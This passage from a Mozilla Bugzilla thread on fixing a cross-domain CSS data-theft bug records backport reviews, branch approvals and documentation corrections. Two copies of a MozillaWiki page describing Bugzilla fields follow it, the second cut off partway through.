mLoaderPrincipal == null means we don't plan to use it or that the loader is system. LoadInlineStyle should perhaps set the principal to that of the element just for consistency and we should document the meaning of null on the member. My apologies for not having done that originally....

|  | [David Baron :dbaron: (⌚️UTC-4, no longer working on Mozilla)](/user_profile?user_id=3881) |  |
| --- | --- | --- |
| [Comment 78](/show_bug.cgi?id=524223#c78)• 15 years ago |
|  | |

(In reply to [comment #76](/show_bug.cgi?id=524223#c76 "RESOLVED FIXED - Cross-domain data theft using CSS"))
> Tangential question: it occurs to me that we should, perhaps, make trunk do
> this heuristic for the case of an absent Content-Type header, since that
> officially does mean "sniff", and sites that leave HTML content untagged would
> still be vulnerable to this attack if we blindly assume untagged is good CSS
> (as we currently do on trunk). On the other hand, that does mean we're stuck
> with the heuristic going forward; but it's not nearly so ugly as it was the
> first time around (and would be less ugly still on trunk, where I can change
> interfaces and strings ;) What do you think?
I don't think so.
Either:
(a) Unlabeled is supported, in which case we shouldn't inflict on it the horrible forwards-compatibility implications of this approach, or
(b) Unlabeled is unspported, in which case we should move towards rejecting it always.

|  | [LegNeato](/user_profile?user_id=482154) |  |
| --- | --- | --- |
| [Comment 79](/show_bug.cgi?id=524223#c79)• 15 years ago |
|  | |

Comment on [attachment 438558](/attachment.cgi?id=438558 "1.9.2 branch patch with dbaron's high-level changes made") [[details]](/attachment.cgi?id=438558&action=edit "1.9.2 branch patch with dbaron's high-level changes made") [[diff]](/attachment.cgi?id=438558&action=diff "1.9.2 branch patch with dbaron's high-level changes made") [[review]](/page.cgi?id=splinter.html&ignore=&bug=524223&attachment=438558)
1.9.2 branch patch with dbaron's high-level changes made
a=LegNeato for 1.9.2.5. Please ONLY land this on mozilla-1.9.2 default, as we
are still working on 1.9.2.4 on the relbranch
[Attachment #438558](/attachment.cgi?id=438558&action=edit "1.9.2 branch patch with dbaron's high-level changes made") -
Flags: approval1.9.2.5? → approval1.9.2.5+

|  | [Zack Weinberg (:zwol)](/user_profile?user_id=34122)  Assignee |  |
| --- | --- | --- |
| [Comment 80](/show_bug.cgi?id=524223#c80)• 15 years ago |
|  | |

Attached patch

[1.9.2 branch patch as landed](attachment.cgi?id=447101&action=diff)
— [Details](attachment.cgi?id=447101&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=524223&attachment=447101)

<http://hg.mozilla.org/releases/mozilla-1.9.2/rev/17391b64e790>
With the changes indicated in [comment 76](/show_bug.cgi?id=524223#c76 "RESOLVED FIXED - Cross-domain data theft using CSS"). Landed on mozilla-1.9.2 default only, as per [comment 79](/show_bug.cgi?id=524223#c79 "RESOLVED FIXED - Cross-domain data theft using CSS"). 1.9.1 backport to follow.
[Attachment #438558](/attachment.cgi?id=438558&action=edit "1.9.2 branch patch with dbaron's high-level changes made") -
Attachment is obsolete: true
[Attachment #439488](/attachment.cgi?id=439488&action=edit "1.9.2 patch backported to 1.9.1") -
Attachment is obsolete: true

|  | [Zack Weinberg (:zwol)](/user_profile?user_id=34122)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=524223#a18383199_34122)• 15 years ago |

Keywords: [relnote](/buglist.cgi?keywords=relnote&resolution=---)Whiteboard: [sg:moderate][3.6.x] → [sg:moderate][3.5.x]

|  | [Zack Weinberg (:zwol)](/user_profile?user_id=34122)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=524223#a18383253_34122)• 15 years ago |

[status1.9.2](/buglist.cgi?f1=cf_status_192&o1=isnotempty):
[wanted](/buglist.cgi?f1=cf_status_192&o1=equals&v1=wanted) → [.5-fixed](/buglist.cgi?f1=cf_status_192&o1=equals&v1=.5-fixed)

|  | [Zack Weinberg (:zwol)](/user_profile?user_id=34122)  Assignee |  |
| --- | --- | --- |
| [Comment 81](/show_bug.cgi?id=524223#c81)• 15 years ago |
|  | |

Attached patch

[1.9.1 backport of as-landed 1.9.2 patch](attachment.cgi?id=447120&action=diff)
— [Details](attachment.cgi?id=447120&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=524223&attachment=447120)

This might or might not need separate review but I am marking it for review anyway out of an abundance of caution. Most of the differences from the 1.9.2 version have to do with ns(I)DOMWindowUtils not being in the same place on this branch.
I renamed all the \_1\_9\_2 interfaces to \_1\_9\_1, but I used the same UUID for nsICSSParser\_1\_9\_1 on this branch as for nsICSSParser\_1\_9\_2 on the 1.9.2 branch since the duck type is the same. nsIDOMWindowUtils\_1\_9\_1 does \*not\* have the same duck type so it gets a new UUID. Please let me know if this is the wrong approach.
[Attachment #447120](/attachment.cgi?id=447120&action=edit "1.9.1 backport of as-landed 1.9.2 patch") -
Flags: review?(dbaron)
[Attachment #447120](/attachment.cgi?id=447120&action=edit "1.9.1 backport of as-landed 1.9.2 patch") -
Flags: approval1.9.1.11?
[Attachment #447120](/attachment.cgi?id=447120&action=edit "1.9.1 backport of as-landed 1.9.2 patch") -
Flags: approval1.9.1.10?

|  | [David Baron :dbaron: (⌚️UTC-4, no longer working on Mozilla)](/user_profile?user_id=3881) |  |
| --- | --- | --- |
| [Comment 82](/show_bug.cgi?id=524223#c82)• 15 years ago |
|  | |

Comment on [attachment 447120](/attachment.cgi?id=447120 "1.9.1 backport of as-landed 1.9.2 patch") [[details]](/attachment.cgi?id=447120&action=edit "1.9.1 backport of as-landed 1.9.2 patch") [[diff]](/attachment.cgi?id=447120&action=diff "1.9.1 backport of as-landed 1.9.2 patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=524223&attachment=447120)
1.9.1 backport of as-landed 1.9.2 patch
r=dbaron
It would definitely be good to get this in in the 1.9.1 release matching the 1.9.2 release that has it.
[Attachment #447120](/attachment.cgi?id=447120&action=edit "1.9.1 backport of as-landed 1.9.2 patch") -
Flags: review?(dbaron) → review+

|  | [Mike Beltzner [:beltzner, not reading bugmail]](/user_profile?user_id=137548) |  |
| --- | --- | --- |
| [Comment 83](/show_bug.cgi?id=524223#c83)• 15 years ago |
|  | |

Comment on [attachment 447120](/attachment.cgi?id=447120 "1.9.1 backport of as-landed 1.9.2 patch") [[details]](/attachment.cgi?id=447120&action=edit "1.9.1 backport of as-landed 1.9.2 patch") [[diff]](/attachment.cgi?id=447120&action=diff "1.9.1 backport of as-landed 1.9.2 patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=524223&attachment=447120)
1.9.1 backport of as-landed 1.9.2 patch
a=beltzner for 1.9.1.11, please land on mozilla-1.9.2 default
[Attachment #447120](/attachment.cgi?id=447120&action=edit "1.9.1 backport of as-landed 1.9.2 patch") -
Flags: approval1.9.1.11?
[Attachment #447120](/attachment.cgi?id=447120&action=edit "1.9.1 backport of as-landed 1.9.2 patch") -
Flags: approval1.9.1.11+
[Attachment #447120](/attachment.cgi?id=447120&action=edit "1.9.1 backport of as-landed 1.9.2 patch") -
Flags: approval1.9.1.10?

|  | [Mike Beltzner [:beltzner, not reading bugmail]](/user_profile?user_id=137548) |  |
| --- | --- | --- |
| [Comment 84](/show_bug.cgi?id=524223#c84)• 15 years ago |
|  | |

(In reply to [comment #83](/show_bug.cgi?id=524223#c83 "RESOLVED FIXED - Cross-domain data theft using CSS"))
> (From update of [attachment 447120](/attachment.cgi?id=447120 "1.9.1 backport of as-landed 1.9.2 patch") [[details]](/attachment.cgi?id=447120&action=edit "1.9.1 backport of as-landed 1.9.2 patch") [[diff]](/attachment.cgi?id=447120&action=diff "1.9.1 backport of as-landed 1.9.2 patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=524223&attachment=447120))
> a=beltzner for 1.9.1.11, please land on mozilla-1.9.2 default
Errr - mozilla-1.9.1 default

|  | [Zack Weinberg (:zwol)](/user_profile?user_id=34122)  Assignee |  |
| --- | --- | --- |
| [Comment 85](/show_bug.cgi?id=524223#c85)• 15 years ago |
|  | |

<http://hg.mozilla.org/releases/mozilla-1.9.1/rev/09eee2c3794f>
[status1.9.1](/buglist.cgi?f1=cf_status_191&o1=isnotempty):
[wanted](/buglist.cgi?f1=cf_status_191&o1=equals&v1=wanted) → [.11-fixed](/buglist.cgi?f1=cf_status_191&o1=equals&v1=.11-fixed)Whiteboard: [sg:moderate][3.5.x] → [sg:moderate]

|  | [Eric Shepherd [:sheppy]](/user_profile?user_id=241123) |  |
| --- | --- | --- |
| [Comment 86](/show_bug.cgi?id=524223#c86)• 15 years ago |
|  | |

Documentation updated:
<https://developer.mozilla.org/en/Incorrect_MIME_Type_for_CSS_Files>
<https://developer.mozilla.org/en/Properly_Configuring_Server_MIME_Types>Keywords: [dev-doc-needed](/buglist.cgi?keywords=dev-doc-needed&resolution=---) → [dev-doc-complete](/buglist.cgi?keywords=dev-doc-complete&resolution=---)

|  | [Zack Weinberg (:zwol)](/user_profile?user_id=34122)  Assignee |  |
| --- | --- | --- |
| [Comment 87](/show_bug.cgi?id=524223#c87)• 15 years ago |
|  | |

(In reply to [comment #86](/show_bug.cgi?id=524223#c86 "RESOLVED FIXED - Cross-domain data theft using CSS"))
> Documentation updated:
>
> <https://developer.mozilla.org/en/Incorrect_MIME_Type_for_CSS_Files>
> <https://developer.mozilla.org/en/Properly_Configuring_Server_MIME_Types>
You documented the trunk behavior as if it applied to 3.5 and 3.6 as well, but that's not quite right. 3.5 and 3.6, to avoid breaking quite so many sites, will content-sniff a cross-domain load with the wrong MIME type and reject it only if the first thing in the file appears not to be a valid CSS construct. Firefox 4 \*will\* just reject the load regardless of contents, though.

|  | [Eric Shepherd [:sheppy]](/user_profile?user_id=241123) |  |
| --- | --- | --- |
| [Comment 88](/show_bug.cgi?id=524223#c88)• 15 years ago |
|  | |

Ah! OK, that was unclear from the many comments here. I've updated those articles now.

|  | [Zack Weinberg (:zwol)](/user_profile?user_id=34122)  Assignee |  |
| --- | --- | --- |
| [Comment 89](/show_bug.cgi?id=524223#c89)• 15 years ago |
|  | |

Still not quite right, I'm afraid. All of these changes only apply for \*cross origin\* stylesheet loads. Quirks mode loads of same-origin stylesheets are same as they ever were, trunk and branches both.

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Comment 90](/show_bug.cgi?id=524223#c90)• 15 years ago |
|  | |

Marking as verified for 1.9.1 and 1.9.2 based on passing checked in tests for this.Keywords: [verified1.9.1](/buglist.cgi?keywords=verified1.9.1&resolution=---),
[verified1.9.2](/buglist.cgi?keywords=verified1.9.2&resolution=---)

|  | [Mike Hommey [:glandium]](/user_profile?user_id=47192) |  |
| --- | --- | --- |
| [Comment 91](/show_bug.cgi?id=524223#c91)• 15 years ago |
|  | |

Attached patch

[1.9.0 backport](attachment.cgi?id=459893&action=diff) (obsolete)
— [Details](attachment.cgi?id=459893&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=524223&attachment=459893)

This is the backport I did for a Debian stable update.
[Attachment #459893](/attachment.cgi?id=459893&action=edit "1.9.0 backport") -
Flags: review?(dbaron)

|  | [Zack Weinberg (:zwol)](/user_profile?user_id=34122)  Assignee |  |
| --- | --- | --- |
| [Comment 92](/show_bug.cgi?id=524223#c92)• 15 years ago |
|  | |

I'm not familiar enough with code that old to criticize your backport in detail, Mike, but I'll mention a couple of high-level issues.
+ formattedMessage.AppendLiteral(" This cross-domain request will be "
+ "ignored by the next major release of "
+ "this browser.");
This diagnostic is going to be confusing coming from ff3.0. Please change to something like "ignored by Gecko 1.9.3 (e.g. Firefox 4.0)".
+++ b/layout/style/test/ccd-standards.html
This test is unreliable if you don't also backport [bug 536603](/show_bug.cgi?id=536603 "RESOLVED INACTIVE - Intermittent layout/style/test/test_css_cross_domain.html | quirks IB1l - got rgb(255, 0, 0), expected rgb(0, 255, 0)").

|  | [Jesse Ruderman](/user_profile?user_id=11608) |  |
| --- | --- | --- |
| [Comment 93](/show_bug.cgi?id=524223#c93)• 15 years ago |
|  | |

(Gecko 1.9.3 was renamed to Gecko 2.0.)

|  | [Mike Hommey [:glandium]](/user_profile?user_id=47192) |  |
| --- | --- | --- |
| [Comment 94](/show_bug.cgi?id=524223#c94)• 14 years ago |
|  | |

(In reply to [comment #92](/show_bug.cgi?id=524223#c92 "RESOLVED FIXED - Cross-domain data theft using CSS"))
> I'm not familiar enough with code that old to criticize your backport in
> detail, Mike, but I'll mention a couple of high-level issues.
>
> + formattedMessage.AppendLiteral(" This cross-domain request will be "
> + "ignored by the next major release of "
> + "this browser.");
>
> This diagnostic is going to be confusing coming from ff3.0. Please change to
> something like "ignored by Gecko 1.9.3 (e.g. Firefox 4.0)".
Fair enough, but please note that I backported the patch from ff3.5... which means ff3.5 says the same.

|  | [David Baron :dbaron: (⌚️UTC-4, no longer working on Mozilla)](/user_profile?user_id=3881) |  |
| --- | --- | --- |
| [Comment 95](/show_bug.cgi?id=524223#c95)• 14 years ago |
|  | |

Comment on [attachment 459893](/attachment.cgi?id=459893 "1.9.0 backport") [[details]](/attachment.cgi?id=459893&action=edit "1.9.0 backport") [[diff]](/attachment.cgi?id=459893&action=diff "1.9.0 backport") [[review]](/page.cgi?id=splinter.html&ignore=&bug=524223&attachment=459893)
1.9.0 backport
> PRBool CSSParserImpl::ParsePageRule(nsresult& aErrorCode, RuleAppendFunc aAppendFunc, void\* aData)
> {
>- // XXX not yet implemented
Don't remove the "XXX not yet implemented" comment; it wasn't
removed in the original.
It looks like your patch dropped the three deletes of empty files
layout/style/test/redirect-{1,2,3}.css . Is that a git quirk? Please make
sure they get CVS removed if they're supposed to be removed.
r=dbaron with that fixed, though I can't really say I remember what's
different about the CSS parser since 1.9.
Please make sure that all layout/style/test mochitests pass before you land.
[Attachment #459893](/attachment.cgi?id=459893&action=edit "1.9.0 backport") -
Flags: review?(dbaron) → review+

|  | [David Baron :dbaron: (⌚️UTC-4, no longer working on Mozilla)](/user_profile?user_id=3881) |  |
| --- | --- | --- |
| [Comment 96](/show_bug.cgi?id=524223#c96)• 14 years ago |
|  | |

That said, I really don't see why you want to backport this to 1.9.0; I think there are many much-more-serious security bugs that are unfixed on that (unsupported) branch. I'd prefer leaving it alone.

|  | [Mike Hommey [:glandium]](/user_profile?user_id=47192) |  |
| --- | --- | --- |
| [Comment 97](/show_bug.cgi?id=524223#c97)• 14 years ago |
|  | |

(In reply to [comment #95](/show_bug.cgi?id=524223#c95 "RESOLVED FIXED - Cross-domain data theft using CSS"))
> It looks like your patch dropped the three deletes of empty files
> layout/style/test/redirect-{1,2,3}.css . Is that a git quirk? Please make
> sure they get CVS removed if they're supposed to be removed.
Looks like a quirk from when I applied the patch on my local tree.
> r=dbaron with that fixed, though I can't really say I remember what's
> different about the CSS parser since 1.9.
>
> Please make sure that all layout/style/test mochitests pass before you land.
I did.
(In reply to [comment #96](/show_bug.cgi?id=524223#c96 "RESOLVED FIXED - Cross-domain data theft using CSS"))
> That said, I really don't see why you want to backport this to 1.9.0; I think
> there are many much-more-serious security bugs that are unfixed on that
> (unsupported) branch. I'd prefer leaving it alone.
Debian is still supporting the 3.0 code base. I have backported all security fixes that affect 3.0 (except the Math.random one), but most of the time there is no need to modify the patches. Only in these cases I send the modified patch for review and to possibly avoid to someone else doing the work again.

|  | [Mike Hommey [:glandium]](/user_profile?user_id=47192) |  |
| --- | --- | --- |
| [Comment 98](/show_bug.cgi?id=524223#c98)• 14 years ago |
|  | |

Attached patch

[1.9.0 backport](attachment.cgi?id=465966&action=diff)
— [Details](attachment.cgi?id=465966&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=524223&attachment=465966)

Addressed dbaron's comments, and modified warning message per [comment 92](/show_bug.cgi?id=524223#c92 "RESOLVED FIXED - Cross-domain data theft using CSS").
[Attachment #459893](/attachment.cgi?id=459893&action=edit "1.9.0 backport") -
Attachment is obsolete: true

|  | [David Baron :dbaron: (⌚️UTC-4, no longer working on Mozilla)](/user_profile?user_id=3881) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=524223#a25897109_3881)• 14 years ago |

Depends on: [588794](/show_bug.cgi?id=588794 "RESOLVED FIXED - Conditional jump or move depends on uninitialised value(s) [@ CSSLoaderImpl::ParseSheet]")
You need to [log in](/show_bug.cgi?id=524223&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [Zack Weinberg (:zwol)](/user_profile?user_id=34122)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review



=== Content from wiki.mozilla.org_3659d679_20250126_115043.html ===


# BMO/UserGuide/BugFields

From MozillaWiki
< [BMO](/BMO "BMO")‎ | [UserGuide](/BMO/UserGuide "BMO/UserGuide")

[Jump to navigation](#mw-head)
[Jump to search](#searchInput)
## Bugzilla Field Descriptions

Alias
A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.Assignee
This is the person in charge of resolving the bug. Every time this field changes, the status changes to NEW to make it easy to see which new bugs have appeared on a person's list.Blocks
This bug must be resolved before the bugs listed in this field can be resolved.Bug ID
The numeric id of a bug, unique within this entire installation of Bugzilla.CC
Users who may not have a direct role to play on this bug, but who are interested in its progress.Changed
When this bug was last updated.Classification
Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorization.Comment
Bugs have comments added to them by Bugzilla users. You can search for some text in those comments.Comment Tag
Comments can have arbitrary tags added to them to help with filtering as well as mark comments as spam or abusive.Component
Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.Creation date
When the bug was filed.Depends on
The bugs listed here must be resolved before this bug can be resolved.Duplicates
List of bugs that have been marked a duplicate of the bug currently being viewed.Keywords
Keywords are a controlled vocabulary for characterizing bugs across Products and Components. Examples of this field are `regression`, `sec-high`, and `topcrash`. Bugzilla administrators manage [the list of keywords](https://bugzilla.mozilla.org/describekeywords.cgi). If you believe you need a new keyword, [please contact the administrators to discuss](https://bugzilla.mozilla.org/enter_bug.cgi?product=bugzilla.mozilla.org&component=Administration).Mentors
Mentors are users who have offered to help the bug owner with such tasks as setting up a development environment, finding relevant information to fixing the bug, how to submit a patch for review, and finally how to get the fix committed.Needinfo
More information has been requested from specific individuals, or anyone, to move the bug forward to completion.OS
This is the operating system against which the bug was reported.Platform
This is the hardware platform against which the bug was reported (ARM, ARM64, x86, x86\_64, etc).Priority

| Priority | Description |
| --- | --- |
| **--** | No decision |
| **P1** | Fix in the current release cycle |
| **P2** | Fix in the next release cycle or the following (nightly + 1 or nightly + 2) |
| **P3** | Backlog |
| **P4** | Do not use. This priority is for the Web Platform Test bot. |
| **P5** | Will not fix, but will accept a patch |

This field describes the importance and order in which a bug should be fixed compared to other bugs. This field is utilized by the programmers/engineers/release managers/managers to prioritize the work to be done. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [priority definitions](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/priority.html), or for the main Bugzilla project, [Bugzilla:Priority\_System](/Bugzilla%3APriority_System "Bugzilla:Priority System").Product
Bugs are categorised into Products and Components. Select a Classification to narrow down this list.QA Contact
The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.Rank
Used by some groups to provide finer-grained ordering for working on bugs than afforded by the Priority field. Use of this field is restricted to the `rank-setters` group.Regressed by
This bug has been introduced by the bugs listed here.Regressions
This bug has introduced the bugs listed here.Reporter
The person who filed this bug.See Also
This allows you to refer to bugs in other bug tracker installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with a comma. You should normally use this field to refer to bugs in other bug tracker installations, or bugs which are related to, but not known to be duplicates of the bug. Bugs which are regressions should be listed in the Regressed by field (above)Severity
This field describes the impact of a bug. This field is utilized by the programmers/engineers/release managers/managers to determine the severity of issues and used as input for the priority of the bug. It should not be set by people filing bugs. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [severity documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/severity.html).

| Severity | Description |
| --- | --- |
| **--** | Default value for new bugs; bug triagers for components (ie engineers and other core project folks) are expected to update the bug's severity from this value. To avoid them missing new bugs for triage, do not alter this default when filing bugs. |
| **S1** | (Catastrophic) Blocks development/testing, may impact more than 25% of users, causes data loss, likely dot release driver, and no workaround available |
| **S2** | (Serious) Major functionality/product severely impaired or a high impact issue and a satisfactory workaround does not exist |
| **S3** | (Normal) Blocks non-critical functionality or a work around exists |
| **S4** | (Small/Trivial) minor significance, cosmetic issues, low or no impact to users |
| **N/A** | (Not Applicable) The above definitions do not apply to this bug; this value is reserved for bugs of type Task or Enhancement |

Summary
The bug summary is a short sentence which succinctly describes what the bug is about.Target Milestone
For Firefox-related bugs, when a change set (patch) lands in Mozilla-Central, the [sheriffs](/Sheriffing "Sheriffing") will set this field to the corresponding release value for the current Nightly.
Release status and tracking flags are used to mark intentions for when a fix or other patch should land.
If you need to track a bug against a set of milestones other than upcoming versions of Firefox, please tell the Bugzilla team, you may want a custom status flag.Triage Owner
User that is responsible [for triaging bugs in a specific component](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html).Type
This field describes the [type of a bug](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/bug-types.html).

| Type | Description |
| --- | --- |
| **defect** | regression, crash, hang, security vulnerability and any other general issue. |
| **enhancement** | new feature, improvement in UI, performance, etc. and any other request for user-facing changes and enhancements in the product; not engineering changes |
| **task** | refactoring, removal, replacement, enabling or disabling of functionality and any other engineering task |

URL
Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.Version
The version field defines the version of the software the bug was found in.Votes
Some bugs can be voted for, and you can limit your search to bugs with more than a certain number of votes. Votes are not used by Mozilla developers to set priorities.Whiteboard
Each bug has a free-form single line text entry box for adding tags and status information

Retrieved from "<https://wiki.mozilla.org/index.php?title=BMO/UserGuide/BugFields&oldid=1250790>"

## Navigation menu

### Personal tools

* [Log in](/index.php?title=Special:UserLogin&returnto=BMO%2FUserGuide%2FBugFields "You are encouraged to log in; however, it is not mandatory [o]")
* [Request account](/Special%3ARequestAccount "You are encouraged to create an account and log in; however, it is not mandatory")

### Namespaces

* [Page](/BMO/UserGuide/BugFields "View the content page [c]")
* [Discussion](/index.php?title=Talk:BMO/UserGuide/BugFields&action=edit&redlink=1 "Discussion about the content page (page does not exist) [t]")

English

### Views

* [Read](/BMO/UserGuide/BugFields)
* [View source](/index.php?title=BMO/UserGuide/BugFields&action=edit "This page is protected.
  You can view its source [e]")
* [View history](/index.php?title=BMO/UserGuide/BugFields&action=history "Past revisions of this page [h]")

More

### Search

### Navigation

* [Main page](/Main_Page "Visit the main page [z]")
* [Product releases](/Releases)
* [New pages](/Special%3ANewPages)
* [Recent changes](/Special%3ARecentChanges "A list of recent changes in the wiki [r]")
* [Recent uploads](/Special%3ANewFiles)
* [Random page](/Special%3ARandom "Load a random page [x]")
* [Help](/MozillaWiki%3AHelp "The place to find out")

### How to Contribute

* [All-hands meeting](/WeeklyUpdates)
* [Other meetings](/Community_Calendar)
* [Contribute to Mozilla](/Contribute)
* [Community Portal](//community.mozilla.org)
* [Community Participation Guidelines](//www.mozilla.org/en-US/about/governance/policies/participation/)

### MozillaWiki

* [About](/MozillaWiki%3AAbout)
* [Team](/MozillaWiki%3ATeam)
* [Policies](/MozillaWiki%3APolicies)
* [Report a wiki bug](//bugzilla.mozilla.org/enter_bug.cgi?product=Websites&component=wiki.mozilla.org)

### Around Mozilla

* [Mozilla Support](//support.mozilla.org/)
* [Mozilla Developer Network](//developer.mozilla.org/)
* [Planet Mozilla](//planet.mozilla.org/)
* [Mozilla Blog](//blog.mozilla.org/)
* [Research](//www.mozilla.org/research/)

### Tools

* [What links here](/Special%3AWhatLinksHere/BMO/UserGuide/BugFields "A list of all wiki pages that link here [j]")
* [Related changes](/Special%3ARecentChangesLinked/BMO/UserGuide/BugFields "Recent changes in pages linked from this page [k]")
* [Special pages](/Special%3ASpecialPages "A list of all special pages [q]")
* Printable version
* [Permanent link](/index.php?title=BMO/UserGuide/BugFields&oldid=1250790 "Permanent link to this revision of this page")
* [Page information](/index.php?title=BMO/UserGuide/BugFields&action=info "More information about this page")

* This page was last edited on 14 May 2024, at 14:22.

* [Privacy policy](/MozillaWiki%3APrivacy_policy)
* [About MozillaWiki](/MozillaWiki%3AAbout)
* [Mobile view](https://wiki.mozilla.org/index.php?title=BMO/UserGuide/BugFields&mobileaction=toggle_view_mobile)

* [![Powered by MediaWiki](/resources/assets/poweredby_mediawiki_88x31.png)](https://www.mediawiki.org/)



=== Content from wiki.mozilla.org_73f8d6fa_20250126_115044.html ===


# BMO/UserGuide/BugFields

From MozillaWiki
< [BMO](/BMO "BMO")‎ | [UserGuide](/BMO/UserGuide "BMO/UserGuide")

[Jump to navigation](#mw-head)
[Jump to search](#searchInput)
## Bugzilla Field Descriptions

Alias
A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.Assignee
This is the person in charge of resolving the bug. Every time this field changes, the status changes to NEW to make it easy to see which new bugs have appeared on a person's list.Blocks
This bug must be resolved before the bugs listed in this field can be resolved.Bug ID
The numeric id of a bug, unique within this entire installation of Bugzilla.CC
Users who may not have a direct role to play on this bug, but who are interested in its progress.Changed
When this bug was last updated.Classification
Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorization.Comment
Bugs have comments added to them by Bugzilla users. You can search for some text in those comments.Comment Tag
Comments can have arbitrary tags added to them to help with filtering as well as mark comments as spam or abusive.Component
Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.Creation date
When the bug was filed.Depends on
The bugs listed here must be resolved before this bug can be resolved.Duplicates
List of bugs that have been marked a duplicate of the bug currently being viewed.Keywords
Keywords are a controlled vocabulary for characterizing bugs across Products and Components. Examples of this field are `regression`, `sec-high`, and `topcrash`. Bugzilla administrators manage [the list of keywords](https://bugzilla.mozilla.org/describekeywords.cgi). If you believe you need a new keyword, [please contact the administrators to discuss](https://bugzilla.mozilla.org/enter_bug.cgi?product=bugzilla.mozilla.org&component=Administration).Mentors
Mentors are users who have offered to help the bug owner with such tasks as setting up a development environment, finding relevant information to fixing the bug, how to submit a patch for review, and finally how to get the fix committed.Needinfo
More information has been requested from specific individuals, or anyone, to move the bug forward to completion.OS
This is the operating system against which the bug was reported.Platform
This is the hardware platform against which the bug was reported (ARM, ARM64, x86, x86\_64, etc).Priority

| Priority | Description |
| --- | --- |
| **--** | No decision |
| **P1** | Fix in the current release cycle |
| **P2** | Fix in the next release cycle or the following (nightly + 1 or nightly + 2) |
| **P3** | Backlog |
| **P4** | Do not use. This priority is for the Web Platform Test bot. |
| **P5** | Will not fix, but will accept a patch |

This field describes the importance and order in which a bug should be fixed compared to other bugs. This field is utilized by the programmers/engineers/release managers/managers to prioritize the work to be done. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [priority definitions](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/priority.html), or for the main Bugzilla project, [Bugzilla:Priority\_System](/Bugzilla%3APriority_System "Bugzilla:Priority System").Product
Bugs are categorised into Products and Components. Select a Classification to narrow down this list.QA Contact
The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.Rank
Used by some groups to provide finer-grained ordering for working on bugs than afforded by the Priority field. Use of this field is restricted to the `rank-setters` group.Regressed by
This bug has been introduced by the bugs listed here.Regressions
This bug has introduced the bugs listed here.Reporter
The person who filed this bug.See Also
This allows you to refer to bugs in other bug tracker installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with a comma. You should normally use this field to refer to bugs in other bug tracker installations, or bugs which are related to, but not known to be duplicates of the bug. Bugs which are regressions should be listed in the Regressed by field (above)Severity
This field describes the impact of a bug. This field is utilized by the programmers/engineers/release managers/managers to determine the severity of issues and used as input for the priority of the bug. It should not be set by people filing bugs. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [severity documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/severity.html).

| Severity | Description |
| --- | --- |
| **--** | Default value for new bugs; bug triagers for components (ie engineers and other core project folks) are expected to update the bug's severity from this value. To avoid them missing new bugs for triage, do not alter this default when filing bugs. |
| **S1** | (Catastrophic) Blocks development/testing, may impact more than 25% of users, causes data loss, likely dot release driver, and no workaround available |
| **S2** | (Serious) Major functionality/product severely impaired or a high impact issue and a satisfactory workaround does not exist |
| **S3** | (Normal) Blocks non-critical functionality or a work around exists |
| **S4** | (Small/Trivial) minor significance, cosmetic issues, low or no impact to users |
| **N/A** | (Not Applicable) The above definitions do not apply to this bug; this value is reserved for bugs of type Task or Enhancement |

Summary
The bug summary is a short sentence which succinctly describes what the bug is about.Target Milestone
For Firefox-related bugs, when a change set (patch) lands in Mozilla-Central, the [sheriffs](/Sheriffing "Sheriffing") will set this field to the corresponding release value for the current Nightly.
Release status and tracking flags are used to mark intentions for when a fix or other patch should land.
If you need to track a bug against a set of milestones other than upcoming versions of Firefox, please tell the Bugzilla team, you may want a custom status flag.Triage Owner
User that is responsible [for triaging bugs in a specific component](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html).Type
This field describes the [type of a bug](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/bug-types.html).

| Type | Description |
| --- | --- |
| **defect** | regression, crash, hang, security vulnerability and any other general issue. |
| **enhancement** | new feature, improvement in UI, performance, etc. and any other request for user-facing changes and enhancements in the product; not engineering changes |
| **task** | refactoring, removal, replacement, enabling or disabling of functionality and any other engineering task |

URL
Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.Version
The version field defines the version of the software the bug was found in.Votes
